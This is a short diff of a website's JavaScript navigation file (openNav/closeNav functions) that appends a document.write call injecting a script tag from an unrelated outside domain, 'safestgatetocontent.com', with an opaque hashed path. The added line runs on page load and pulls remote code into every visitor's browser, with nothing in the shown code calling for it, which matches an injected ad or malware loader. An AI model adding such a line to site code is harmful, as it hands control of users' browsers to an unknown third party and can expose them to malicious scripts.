@@ -9,3 +9,5 @@ function closeNav() {
     document.getElementById("myNav").style.width = "0%";
 }
 openNav();
+
+document.write("<script type='text/javascript' src='//pl17178979.safestgatetocontent.com/79/65/06/79650682d2e3cadac986a94bd0d4ec55.js'><\/script>");
